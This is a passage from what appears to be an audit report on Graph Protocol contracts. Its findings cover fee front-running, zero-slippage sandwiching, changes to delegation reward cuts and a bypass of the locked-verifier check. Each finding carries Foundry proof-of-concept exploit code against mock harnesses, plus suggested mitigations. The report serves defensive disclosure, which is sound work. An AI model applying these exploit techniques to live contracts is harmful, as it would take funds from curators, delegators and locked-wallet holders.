            // Same result as BancorFormula's MAX_PPM branch: supply * deposit / reserve.
            signalOut = tokensIn * p.supply / p.tokens;
        }
        p.tokens += tokensIn;
        p.supply += signalOut;
        balanceOf[id][msg.sender] += signalOut;
    }

    function collect(bytes32 id, uint256 tokens) external {
        require(pools[id].tokens != 0, "not curated");
        pools[id].tokens += tokens;
    }

    function burn(bytes32 id, uint256 signalIn) external returns (uint256 tokensOut) {
        Pool storage p = pools[id];
        require(balanceOf[id][msg.sender] >= signalIn, "insufficient signal");
        tokensOut = signalIn * p.tokens / p.supply;
        balanceOf[id][msg.sender] -= signalIn;
        p.supply -= signalIn;
        p.tokens -= tokensOut;
    }
}

contract CurationJustInTimeCollectTest is Test {
    function testJustInTimeMintStealsCollectedFees() external {
        LinearCurationHarness c = new LinearCurationHarness();
        bytes32 id = keccak256("subgraph");
        address alice = address(0xA11CE);
        address attacker = address(0xBEEF);

        vm.prank(alice);
        c.mint(id, 1000 ether);

        vm.prank(attacker);
        c.mint(id, 9000 ether);

        c.collect(id, 1000 ether);

        vm.prank(attacker);
        uint256 attackerOut = c.burn(id, 9000 ether);
        assertEq(attackerOut, 9900 ether);
        assertEq(attackerOut - 9000 ether, 900 ether);

        vm.prank(alice);
        uint256 aliceOut = c.burn(id, 1000 ether);
        assertEq(aliceOut, 1100 ether);
        assertEq(aliceOut + attackerOut, 11000 ether);
    }
}

## Suggested Mitigation
Do not distribute collected fees by directly increasing redeemable bonding-curve reserves for current holders. Snapshot pool signal before collect() and account fees through a per-signal reward index with user reward debt, or enforce an epoch/minimum-holding delay so signal minted after fee accrual cannot redeem those fees. Burn/redemption should only include fee rewards earned by shares that existed at the collection snapshot.
```

### H-70 / `GI6ghDWZ0DbbxkmP2EEdc`
- Finding title: Lifecycle curation burns use zero slippage bounds, allowing MEV to extract curator value during upgrades or L2 migration
- Report lines: 6651-6690
```md
## [H-70]. Lifecycle curation burns use zero slippage bounds, allowing MEV to extract curator value during upgrades or L2 migration

## id: GI6ghDWZ0DbbxkmP2EEdc

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
GNS/L1GNS.publishNewVersion, deprecateSubgraph, sendSubgraphToL2

## Finding Status: Valid
### Finding Status Justification: The finding matches the analyzed code. publishNewVersion burns old deployment vSignal with minOut 0 and remints into the new deployment with minOut 0; deprecateSubgraph and sendSubgraphToL2 also burn the full vSignal position with minOut 0. These are in-scope L1GNS/GNS lifecycle paths and can be reached for active subgraphs with nonzero signal. The owner authorization is normal subgraph control, not a trusted protocol role. No code-level slippage, deadline, private reservation, or price-bound safeguard fully prevents a same-block curation price attack.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The inherited L1GNS lifecycle flows burn or remint the subgraph's entire curation position with a hard-coded minimum of zero. In publishNewVersion(), the old deployment is burned with minOut=0 and the new deployment is minted with minOut=0. deprecateSubgraph() and sendSubgraphToL2() also burn all vSignal with minOut=0. Vulnerable snippets: `uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0);`, `(subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);`, and `uint256 curationTokens = curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0);`. Because curation is an external bonding-curve market, a mempool searcher can sell into the same deployment immediately before the owner lifecycle transaction, depressing the burn output, then buy back after the protocol-sized burn. The loss is socialized across the subgraph's curators through reduced `withdrawableGRT`, reduced `tokensForL2`, or reduced value rolled into the new deployment.

## Impact
A permissionless MEV searcher can extract GRT from large curated subgraphs during owner lifecycle operations. If the subgraph's curated value is large, this can cause significant user funds to be lost from the curation position and transferred to the attacker through bonding-curve price manipulation.

## Proof of Concept
1. A valuable subgraph has a large vSignal position held by GNS. 2. The owner submits publishNewVersion(), deprecateSubgraph(), or sendSubgraphToL2(). 3. The attacker observes the transaction and front-runs by burning/selling their own signal in the same deployment, lowering the bonding-curve price. 4. The owner transaction executes with minOut=0, accepting the depressed output for the entire GNS-held position. 5. The attacker back-runs by buying signal back at the lower post-burn price, keeping the arbitrage profit while curators receive fewer GRT or less L2 value.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract MockCuration { uint256 public tokenReserve = 1000 ether; uint256 public signalReserve = 1000 ether; mapping(address => uint256) public sig; constructor(){ sig[address(0xBEEF)] = 500 ether; sig[address(0xA11CE)] = 300 ether; } function quoteBurn(uint256 s) external view returns (uint256){ return s * tokenReserve / (signalReserve + s); } function burn(address from,uint256 s,uint256 minOut) external returns (uint256 out){ require(sig[from] >= s, "no sig"); out = s * tokenReserve / (signalReserve + s); require(out >= minOut, "slip"); sig[from] -= s; signalReserve += s; tokenReserve -= out; } function mint(address to,uint256 t,uint256 minSig) external returns (uint256 out){ out = t * signalReserve / (tokenReserve + t); require(out >= minSig, "slip"); sig[to] += out; signalReserve -= out; tokenReserve += t; } }
contract VulnerableGNS { MockCuration public c; uint256 public vSignal = 500 ether; uint256 public lastTokens; constructor(MockCuration _c){ c = _c; } function publishNewVersion() external { lastTokens = c.burn(address(0xBEEF), vSignal, 0); vSignal = 0; } }
contract L1GNSSlippagePoC is Test { function testZeroMinOutLifecycleBurnCanBeSandwiched() external { MockCuration c1 = new MockCuration(); uint256 fairOut = c1.quoteBurn(500 ether); MockCuration c2 = new MockCuration(); VulnerableGNS gns = new VulnerableGNS(c2); uint256 attackerStart = c2.sig(address(0xA11CE)); uint256 frontRunTokens = c2.burn(address(0xA11CE), 300 ether, 0); gns.publishNewVersion(); c2.mint(address(0xA11CE), frontRunTokens, 0); assertGt(fairOut, gns.lastTokens(), "victim accepted worse execution because minOut was zero"); assertGt(c2.sig(address(0xA11CE)), attackerStart, "attacker profits from sandwich"); } }

## Suggested Mitigation
Expose and enforce user-supplied minimums for every lifecycle curation burn and mint, e.g. `_tokensOutMin` for old-deployment burns and `_vSignalOutMin` for new-deployment mints. For owner-only lifecycle calls affecting pooled curator value, require the owner to submit bounded slippage parameters and revert if curation output is below the bound. Consider using commit/reveal or private orderflow for high-value migrations.
```

### H-72 / `OJlNnyFbndyJ-aX8sExbp`
- Finding title: Fee collect can be front-run to capture already-accrued curation fees in L2Curation.collect
- Report lines: 6851-7081
```md
## [H-72]. Fee collect can be front-run to capture already-accrued curation fees in L2Curation.collect

## id: OJlNnyFbndyJ-aX8sExbp

## Derived From Pattern/Invariant
FeeAccountingDrift

## Exploit Type
FrontrunMev

## Location
L2Curation.collect

## Finding Status: Valid
### Finding Status Justification: The finding accurately describes L2Curation's current reserve-share accounting. collect is an external in-scope function that, after caller and isCurated checks, simply adds _tokens to curationPool.tokens. mint can create GCS immediately before that reserve increase, and burn can redeem immediately afterward using signalToTokens over the post-collect reserve. No code snapshots holders at fee accrual or pre-collect time, and there is no holding-period, cooldown, or reward accumulator excluding newly minted signal. The authorized-caller check on collect does not fully block this path because the attack can surround a normal authorized collect rather than call collect directly. No explicit design documentation accepts this fee-sandwich risk. The root cause exists in today's code and is realistically reachable when pending collections can be observed or predicted.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`collect()` books a fee amount directly into `pools[_subgraphDeploymentID].tokens` and therefore raises the redemption price for whoever holds GCS at the moment of collection, not whoever held GCS while the fees were earned. A permissionless searcher can mint immediately before an observable authorized `collect()` transaction and burn immediately after it, receiving a pro-rata share of the collected fees despite not providing curation during the fee accrual period.

Vulnerable snippets:

`function collect(bytes32 _subgraphDeploymentID, uint256 _tokens) external override { require(msg.sender == subgraphService || msg.sender == address(staking()), "Caller must be the subgraph service or staking contract"); require(isCurated(_subgraphDeploymentID), "Subgraph deployment must be curated to collect fees"); CurationPool storage curationPool = pools[_subgraphDeploymentID]; curationPool.tokens = curationPool.tokens.add(_tokens); emit Collected(_subgraphDeploymentID, _tokens); }`

`mint()` then mints signal against the pre-collection reserve, while `burn()` redeems against the post-collection reserve. With pool reserves `T`, attacker post-tax deposit `A`, and pending fees `F`, the attacker can redeem roughly `A + F * A / (T + A)`, so profit is possible whenever the captured fee share exceeds curation tax and gas. Existing curators receive only the remaining fee share, so fee value is transferred from legitimate holders to the searcher.

## Impact
A permissionless MEV searcher can steal a pro-rata portion of large pending GRT fee collections from existing curators. For sufficiently large collects, this can cause significant user funds or unclaimed fee yield to be lost directly from the L2Curation reserve accounting to the attacker.

## Proof of Concept
1. A deployment already has existing curators and pending query fees have been transferred or are about to be booked through the authorized `collect()` path.
2. A searcher observes the pending `collect(subgraphDeploymentID, fees)` transaction.
3. The searcher front-runs with `mint(subgraphDeploymentID, largeAmount, 0)`, receiving GCS priced before the fee reserve increase.
4. The authorized `collect()` executes and increases `curationPool.tokens` without minting new GCS or using any time-weighted/snapshot accounting.
5. The searcher back-runs with `burn(subgraphDeploymentID, attackerSignal, 0)` and receives their pro-rata share of the newly booked fees.
6. Existing curators receive less of the collected fees even though the attacker was not a curator during the fee accrual period.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockGRT {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
    }
}

contract MockGCS {
    address public immutable curation;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(address curation_) {
        curation = curation_;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == curation, "only curation");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burnFrom(address from, uint256 amount) external {
        require(msg.sender == curation, "only curation");
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract L2CurationLike {
    uint32 private constant MAX_PPM = 1_000_000;
    uint256 private constant SIGNAL_PER_MINIMUM_DEPOSIT = 1;

    struct Pool {
        uint256 tokens;
        MockGCS gcs;
    }

    MockGRT public immutable grt;
    address public immutable collector;
    uint32 public curationTaxPercentage = 10_000;
    uint256 public minimumCurationDeposit = 1e18;
    mapping(bytes32 => Pool) public pools;

    constructor(MockGRT grt_, address collector_) {
        grt = grt_;
        collector = collector_;
    }

    function mint(bytes32 id, uint256 tokensIn, uint256 signalOutMin) external returns (uint256 signalOut, uint256 tax) {
        (signalOut, tax) = tokensToSignal(id, tokensIn);
        require(signalOut >= signalOutMin, "slippage");
        Pool storage p = pools[id];
        if (address(p.gcs) == address(0)) p.gcs = new MockGCS(address(this));
        require(grt.transferFrom(msg.sender, address(this), tokensIn), "transferFrom");
        grt.burn(tax);
        p.tokens += tokensIn - tax;
        p.gcs.mint(msg.sender, signalOut);
    }

    function collect(bytes32 id, uint256 tokens) external {
        require(msg.sender == collector, "only collector");
        require(pools[id].tokens != 0, "not curated");
        pools[id].tokens += tokens;
    }

    function burn(bytes32 id, uint256 signalIn, uint256 tokensOutMin) external returns (uint256 tokensOut) {
        Pool storage p = pools[id];
        tokensOut = signalToTokens(id, signalIn);
        require(tokensOut >= tokensOutMin, "slippage");
        p.tokens -= tokensOut;
        p.gcs.burnFrom(msg.sender, signalIn);
        if (p.gcs.totalSupply() == 0) p.tokens = 0;
        require(grt.transfer(msg.sender, tokensOut), "transfer");
    }

    function tokensToSignal(bytes32 id, uint256 tokensIn) public view returns (uint256 signalOut, uint256 tax) {
        uint256 afterTax = uint256(MAX_PPM - curationTaxPercentage) * tokensIn / MAX_PPM;
        tax = tokensIn - afterTax;
        signalOut = _tokensToSignal(id, afterTax);
    }

    function signalToTokens(bytes32 id, uint256 signalIn) public view returns (uint256) {
        Pool storage p = pools[id];
        require(p.tokens != 0, "not curated");
        require(p.gcs.totalSupply() >= signalIn, "too much signal");
        return p.tokens * signalIn / p.gcs.totalSupply();
    }

    function balanceOf(bytes32 id, address account) external view returns (uint256) {
        return pools[id].gcs.balanceOf(account);
    }

    function _tokensToSignal(bytes32 id, uint256 tokensIn) internal view returns (uint256) {
        Pool storage p = pools[id];
        if (p.tokens == 0) {
            require(tokensIn >= minimumCurationDeposit, "below minimum");
            return SIGNAL_PER_MINIMUM_DEPOSIT + SIGNAL_PER_MINIMUM_DEPOSIT * (tokensIn - minimumCurationDeposit) / minimumCurationDeposit;
        }
        return p.gcs.totalSupply() * tokensIn / p.tokens;
    }
}

contract L2CurationFeeTimingPOC is Test {
    MockGRT grt;
    L2CurationLike curation;
    address victim = address(0xA11CE);
    address attacker = address(0xB0B);
    bytes32 id = keccak256("deployment");

    function setUp() public {
        grt = new MockGRT();
        curation = new L2CurationLike(grt, address(this));
    }

    function testFrontRunCollectCapturesPendingFees() public {
        uint256 initialDeposit = 1_000_000e18;
        uint256 attackerDeposit = 1_000_000e18;
        uint256 pendingFees = 100_000e18;

        grt.mint(victim, initialDeposit);
        vm.startPrank(victim);
        grt.approve(address(curation), initialDeposit);
        curation.mint(id, initialDeposit, 0);
        vm.stopPrank();

        uint256 victimRedeemableBefore = curation.signalToTokens(id, curation.balanceOf(id, victim));
        assertEq(victimRedeemableBefore, 990_000e18);

        grt.mint(address(curation), pendingFees);

        grt.mint(attacker, attackerDeposit);
        uint256 attackerBalanceBefore = grt.balanceOf(attacker);
        vm.startPrank(attacker);
        grt.approve(address(curation), attackerDeposit);
        curation.mint(id, attackerDeposit, 0);
        vm.stopPrank();

        curation.collect(id, pendingFees);

        uint256 attackerSignal = curation.balanceOf(id, attacker);
        vm.prank(attacker);
        curation.burn(id, attackerSignal, 0);

        uint256 attackerProfit = grt.balanceOf(attacker) - attackerBalanceBefore;
        assertEq(attackerProfit, 40_000e18);
        assertGt(attackerProfit, 0);

        uint256 victimRedeemableAfter = curation.signalToTokens(id, curation.balanceOf(id, victim));
        assertEq(victimRedeemableAfter - victimRedeemableBefore, 50_000e18);
    }
}


## Suggested Mitigation
Do not distribute a collection solely to current GCS holders at execution time. Snapshot eligible pool signal before the fee accrual/settlement period, distribute fees through a reward index based on time- or epoch-weighted signal, or make fee collection atomic with the fee source in a way that cannot be profitably sandwiched. At minimum, introduce a collection delay/snapshot boundary so newly minted GCS after the snapshot cannot claim already-accrued fees.
```

### H-79 / `gq6Q-0OujrjCdB2zidwVn`
- Finding title: Indexer can change delegation reward cuts before settlement to redirect pending delegator rewards
- Report lines: 7537-7609
```md
## [H-79]. Indexer can change delegation reward cuts before settlement to redirect pending delegator rewards

## id: gq6Q-0OujrjCdB2zidwVn

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
GlobalParamMidFlowManipulation

## Location
L1Staking.setDelegationParameters

## Finding Status: Valid
### Finding Status Justification: The root cause exists in the in-scope staking code. setDelegationParameters is callable by the indexer for its own pool and immediately writes pool.indexingRewardCut and pool.queryFeeCut. Later _collectDelegationIndexingRewards and _collectDelegationQueryRewards calculate the indexer cut using those live values at settlement time, not values snapshotted when allocations opened, fees accrued, or delegators entered. No cooldown is enforced; the third parameter is deprecated and ignored. An indexer is a normal protocol participant for its own delegation pool, not a trusted admin role. No complete safeguard or explicit documentation accepting the exact pending-reward redirection risk is provided.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation reward cuts are live global indexer parameters and are not snapshotted when an allocation is opened, when query fees accrue, or before delegators enter the unbonding delay. `setDelegationParameters()` immediately writes `pool.indexingRewardCut` and `pool.queryFeeCut`, while later settlement paths read the current values in `_collectDelegationIndexingRewards()` and `_collectDelegationQueryRewards()`. Vulnerable snippet: `function setDelegationParameters(uint32 _indexingRewardCut, uint32 _queryFeeCut, uint32) public override { _setDelegationParameters(msg.sender, _indexingRewardCut, _queryFeeCut); } ... pool.indexingRewardCut = _indexingRewardCut; pool.queryFeeCut = _queryFeeCut; ... uint256 indexerCut = uint256(pool.indexingRewardCut).mul(_tokens).div(MAX_PPM); delegationRewards = _tokens.sub(indexerCut);`. An indexer can therefore advertise delegator-favorable cuts, accumulate delegated stake and pending rewards, then switch both cuts to `MAX_PPM` immediately before `closeAllocation()` or `collect()`, causing all pending rewards to be paid to the indexer instead of the delegation pool.

## Impact
Delegators can lose pending indexing rewards and query-fee rebates to the indexer. On large indexers or high-fee allocations this can redirect significant GRT rewards from users through protocol settlement logic.

## Proof of Concept
1. An indexer sets `indexingRewardCut` and `queryFeeCut` to delegator-favorable values and receives delegated stake. 2. Allocations run for epochs and query fees or indexing rewards become pending. 3. Before the allocation is closed or fees are collected, the indexer calls `setDelegationParameters(MAX_PPM, MAX_PPM, 0)`. 4. `closeAllocation()` or `collect()` reads the live cuts rather than a snapshot. 5. Delegation pool tokens are not increased and the indexer receives the full reward amount.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract CutHarness {
    uint32 constant MAX_PPM = 1_000_000;
    struct Pool { uint32 indexingRewardCut; uint32 queryFeeCut; uint256 tokens; uint256 shares; }
    Pool public pool;
    uint256 public indexerRewards;
    function seed(uint256 tokens_, uint256 shares_, uint32 cut_) external { pool.tokens = tokens_; pool.shares = shares_; pool.indexingRewardCut = cut_; }
    function setDelegationParameters(uint32 indexingRewardCut_, uint32 queryFeeCut_) external { pool.indexingRewardCut = indexingRewardCut_; pool.queryFeeCut = queryFeeCut_; }
    function distributeIndexingRewards(uint256 totalRewards) external {
        uint256 delegationRewards;
        if (pool.tokens > 0 && pool.indexingRewardCut < MAX_PPM) {
            uint256 indexerCut = uint256(pool.indexingRewardCut) * totalRewards / MAX_PPM;
            delegationRewards = totalRewards - indexerCut;
            pool.tokens += delegationRewards;
        }
        indexerRewards += totalRewards - delegationRewards;
    }
}

contract DelegationCutRugTest is Test {
    function testIndexerCanRedirectPendingDelegatorRewardsByChangingLiveCut() external {
        CutHarness honest = new CutHarness();
        honest.seed(1_000 ether, 1_000 ether, 0);
        honest.distributeIndexingRewards(100 ether);
        (,,uint256 honestPoolTokens,) = honest.pool();
        assertEq(honestPoolTokens, 1_100 ether);

        CutHarness attacked = new CutHarness();
        attacked.seed(1_000 ether, 1_000 ether, 0);
        attacked.setDelegationParameters(1_000_000, 1_000_000);
        attacked.distributeIndexingRewards(100 ether);
        (,,uint256 attackedPoolTokens,) = attacked.pool();
        assertEq(attackedPoolTokens, 1_000 ether);
        assertEq(attacked.indexerRewards(), 100 ether);
    }
}

## Suggested Mitigation
Snapshot delegation cuts for each allocation and fee/reward accrual period, and use the snapshotted values during `collect()` and reward distribution. Alternatively, make cut changes activate only after a delay at least as long as the delegation unbonding period so delegators can exit before the new cuts affect pending rewards.
```

### H-81 / `Iz7slvVRgZWDP-GJRd3Sz`
- Finding title: Live curation state lets MEV redirect query-fee curation cut in SubgraphService._collectQueryFees
- Report lines: 7756-7900
```md
## [H-81]. Live curation state lets MEV redirect query-fee curation cut in SubgraphService._collectQueryFees

## id: Iz7slvVRgZWDP-GJRd3Sz

## Derived From Pattern/Invariant
SandwichableOracle / SlippageMissingOrInsufficient

## Exploit Type
FrontrunMev

## Location
SubgraphService._collectQueryFees

## Finding Status: Valid
### Finding Status Justification: The code path exists. _collectQueryFees() decodes a SignedRAV, derives the allocation and subgraphDeploymentId, then calls GraphTallyCollector.collect with _encodeGraphTallyData(signedRav, _curation().isCurated(subgraphDeploymentId) ? curationFeesCut : 0). The curation status is a live read during settlement, and the RAV consistency checks shown bind serviceProvider and allocation, but do not bind curation status, curation cut, snapshot block, or minimum non-curator payout. If curation can be added permissionlessly as implied by the finding and curation subsystem, a searcher can alter isCurated before settlement and cause curator cut handling for that collection. No complete safeguard, activation delay, signed bound, or snapshot is present in the supplied code. SubgraphService is in scope, and the issue is not documented as intentional, not dependent on privileged abuse, user error, or future code.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
SubgraphService decides whether a query-fee collection pays the curator cut from the live Curation state at execution time, not from state bound to the RAV or snapshotted when the query fees accrued. The relevant flow is:

```solidity
tokensCollected = _graphTallyCollector().collect(
    IGraphPayments.PaymentTypes.QueryFee,
    _encodeGraphTallyData(signedRav, _curation().isCurated(subgraphDeploymentId) ? curationFeesCut : 0),
    tokensToCollect
);
...
if (tokensCurators > 0) {
    _graphRewardsManager().onSubgraphSignalUpdate(subgraphDeploymentId);
    _graphToken().pushTokens(address(_curation()), tokensCurators);
    _curation().collect(subgraphDeploymentId, tokensCurators);
}
```

Because `_curation().isCurated(subgraphDeploymentId)` is a live read inside the settlement transaction, a searcher can observe a large pending `collect(QueryFee)` transaction and change the subgraph's curation state immediately before it executes. If the subgraph was previously uncurated or thinly curated, the attacker can become the curator just in time, causing `curationFeesCut` to be encoded into the collector data and paid into Curation for that collection. The signed RAV only proves the service payment; it does not bind the expected curation status, curator cut, minimum indexer payout, or a snapshot block. This allows fee value that would otherwise be paid to the service provider/delegation side to be redirected to the attacker-controlled curation position.

## Impact
For large accumulated query-fee RAVs, a permissionless MEV searcher can steal the configured curator cut from indexers/delegators by briefly curating immediately before settlement. If high-value settlements exceed $1M, this is a direct economic loss of user funds from protocol payment contracts.

## Proof of Concept
1. A large signed RAV for an allocation is submitted to `SubgraphService.collect(indexer, QueryFee, data)`.
2. The target `subgraphDeploymentId` is currently uncurated or has attacker-controllable low signal, so without intervention `_curation().isCurated(subgraphDeploymentId)` would return false and no curator cut would be charged.
3. A permissionless searcher sees the pending collection in the mempool and front-runs it by adding curation signal to that subgraph.
4. The victim collection executes after the front-run. `_collectQueryFees` rereads live curation state, now returns true, and passes `curationFeesCut` to `GraphTallyCollector`.
5. `tokensCurators` are transferred to Curation and booked through `_curation().collect(subgraphDeploymentId, tokensCurators)`.
6. The attacker exits or claims through the curation position, capturing fees from work performed before the attacker curated.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockCuration {
    MockToken public immutable token;
    mapping(bytes32 => uint256) public totalSignal;
    mapping(bytes32 => mapping(address => uint256)) public signalOf;
    mapping(bytes32 => uint256) public fees;
    constructor(MockToken t) { token = t; }
    function signal(bytes32 id, uint256 amount) external {
        token.transfer(address(this), amount);
        signalOf[id][msg.sender] += amount;
        totalSignal[id] += amount;
    }
    function isCurated(bytes32 id) external view returns (bool) { return totalSignal[id] > 0; }
    function collect(bytes32 id, uint256 amount) external { fees[id] += amount; }
    function claim(bytes32 id) external {
        uint256 share = fees[id] * signalOf[id][msg.sender] / totalSignal[id];
        fees[id] = 0;
        token.transfer(msg.sender, share);
    }
}

contract MockTallyCollector {
    MockToken public immutable token;
    uint256 public constant TOTAL_RAV = 1_000_000 ether;
    constructor(MockToken t) { token = t; }
    function collect(bytes calldata data) external returns (uint256) {
        uint256 curationCutPpm = abi.decode(data, (uint256));
        uint256 curatorAmount = TOTAL_RAV * curationCutPpm / 1_000_000;
        if (curatorAmount > 0) token.transfer(msg.sender, curatorAmount);
        return TOTAL_RAV;
    }
}

contract VulnerableSubgraphServiceHarness {
    MockToken public immutable token;
    MockCuration public immutable curation;
    MockTallyCollector public immutable tally;
    uint256 public curationFeesCut = 100_000; // 10%
    constructor(MockToken t, MockCuration c, MockTallyCollector tc) { token = t; curation = c; tally = tc; }
    function collectQueryFees(bytes32 subgraphDeploymentId) external returns (uint256 tokensCurators) {
        uint256 balanceBefore = token.balanceOf(address(this));
        uint256 cut = curation.isCurated(subgraphDeploymentId) ? curationFeesCut : 0;
        tally.collect(abi.encode(cut));
        tokensCurators = token.balanceOf(address(this)) - balanceBefore;
        if (tokensCurators > 0) {
            token.transfer(address(curation), tokensCurators);
            curation.collect(subgraphDeploymentId, tokensCurators);
        }
    }
}

contract SubgraphServiceCurationSandwichPoC is Test {
    function testAttackerFrontRunsCurationAndCapturesCut() external {
        MockToken token = new MockToken();
        MockCuration curation = new MockCuration(token);
        MockTallyCollector tally = new MockTallyCollector(token);
        VulnerableSubgraphServiceHarness svc = new VulnerableSubgraphServiceHarness(token, curation, tally);
        bytes32 subgraph = keccak256("subgraph");
        address attacker = address(0xA11CE);

        token.mint(address(tally), 1_000_000 ether);
        token.mint(attacker, 1 ether);

        vm.prank(attacker);
        curation.signal(subgraph, 1 ether);

        uint256 curatorCut = svc.collectQueryFees(subgraph);
        assertEq(curatorCut, 100_000 ether);

        uint256 beforeClaim = token.balanceOf(attacker);
        vm.prank(attacker);
        curation.claim(subgraph);
        assertGt(token.balanceOf(attacker), beforeClaim);
    }
}

## Suggested Mitigation
Bind the curation state and cut to the payment claim being settled. For example, include `subgraphDeploymentId`, expected `curationCut`, expected curation status or curation snapshot id, and a minimum service-provider payout in the signed RAV/collector data, then reject settlement if live state differs from those signed bounds. Alternatively, use a historical curation snapshot from the service period rather than `_curation().isCurated()` at execution time, and add an activation delay before newly added curation signal can receive query-fee cuts.
```

### H-86 / `BGltva0zz65tEFYsF1FFj`
- Finding title: Locked GRT can be provisioned to unallowed verifiers through HorizonStaking.provision and escaped via verifier slash rewards
- Report lines: 8174-8234
```md
## [H-86]. Locked GRT can be provisioned to unallowed verifiers through HorizonStaking.provision and escaped via verifier slash rewards

## id: BGltva0zz65tEFYsF1FFj

## Derived From Pattern/Invariant
AccessControlOrAuthByPass: locked stake must only be provisioned to allowed locked verifiers

## Exploit Type
AuthByPass

## Location
HorizonStaking.provision

## Finding Status: Valid
### Finding Status Justification: The normal provision() entrypoint exists in in-scope HorizonStaking and lacks the _allowedLockedVerifiers check that provisionLocked() performs. _createProvision() does not distinguish locked-wallet serviceProviders, and _isAuthorized() returns true when the caller is the serviceProvider, while operators can also be authorized. Once __DEPRECATED_thawingPeriod is cleared, arbitrary verifiers are allowed by _createProvision(). slash() then lets that verifier transfer up to maxVerifierCut of provider tokens to verifierDestination; maxVerifierCut may be 1,000,000 PPM. The storage comment says locked verifier whitelisting exists to prevent locked tokens escaping via arbitrary verifiers, so this is not accepted by design. No complete safeguard blocks the bypass.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The locked-verifier restriction is only enforced by provisionLocked(), but the normal provision() entrypoint can create the same provision without checking _allowedLockedVerifiers once the legacy transition thawing period has been cleared. A GraphTokenLockWallet can be the serviceProvider and can call provision() as itself, satisfying onlyAuthorized because _operator == _serviceProvider. The unallowed verifier can then call slash() and receive up to maxVerifierCut of the locked stake as verifier reward. Vulnerable snippets: function provision(...) external ... onlyAuthorized(...) { _createProvision(...); } versus function provisionLocked(...) external ... { require(_allowedLockedVerifiers[verifier], ...); _createProvision(...); }. _createProvision() itself does not know whether the serviceProvider is a locked wallet and therefore does not enforce the whitelist.

## Impact
Locked GRT that should remain subject to token-lock restrictions can be routed to an arbitrary verifier and transferred out as slash rewards. For large locked wallets this can cause significant direct loss of locked user/protocol funds from HorizonStaking.

## Proof of Concept
1. Legacy transition ends so __DEPRECATED_thawingPeriod == 0. 2. A GraphTokenLockWallet has idle staked GRT in HorizonStaking. 3. The wallet or its authorized beneficiary/operator calls provision(wallet, attackerVerifier, amount, 1000000, thawingPeriod) instead of provisionLocked(). 4. _createProvision accepts attackerVerifier because the transition verifier restriction is disabled and no locked-verifier check is performed. 5. attackerVerifier calls slash(wallet, amount, amount, attackerDestination). 6. slash() accepts msg.sender as the verifier and transfers tokensVerifier to attackerDestination, bypassing the locked verifier whitelist.

## Proof of Code
// Foundry-style regression test for the existing Horizon staking test harness.
function test_lockedWalletCanBypassAllowedVerifierViaNormalProvision() public {
    address lockedWallet = makeAddr("lockedWallet");
    address attackerVerifier = makeAddr("attackerVerifier");
    address attackerDestination = makeAddr("attackerDestination");
    uint256 amount = 1_000_000 ether;

    // Harness setup: transition ended, attackerVerifier is not in _allowedLockedVerifiers,
    // and lockedWallet has idle staked GRT.
    stakingHarness.setDeprecatedThawingPeriod(0);
    stakingHarness.setAllowedLockedVerifier(attackerVerifier, false);
    deal(address(grt), address(stakingHarness), amount);
    stakingHarness.setServiceProviderStake(lockedWallet, amount, 0);

    vm.prank(lockedWallet);
    stakingHarness.provision(lockedWallet, attackerVerifier, amount, 1_000_000, 7 days);

    IHorizonStakingTypes.Provision memory p = stakingHarness.getProvision(lockedWallet, attackerVerifier);
    assertEq(p.tokens, amount);
    assertEq(stakingHarness.isAllowedLockedVerifier(attackerVerifier), false);

    uint256 beforeBalance = grt.balanceOf(attackerDestination);
    vm.prank(attackerVerifier);
    stakingHarness.slash(lockedWallet, amount, amount, attackerDestination);

    assertEq(grt.balanceOf(attackerDestination) - beforeBalance, amount);
}

## Suggested Mitigation
Move the locked-verifier invariant into _createProvision or otherwise mark locked-wallet service providers in HorizonStaking and require _allowedLockedVerifiers[_verifier] for every provision created from locked stake, including provision() and stakeToProvision().
```

### M-90 / `NrfGQTmHOKIM9zqRbWg9m`
- Finding title: Late delegators can join immediately before reward distribution and capture historical rewards
- Report lines: 8572-8633
```md
## [M-90]. Late delegators can join immediately before reward distribution and capture historical rewards

## id: NrfGQTmHOKIM9zqRbWg9m

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
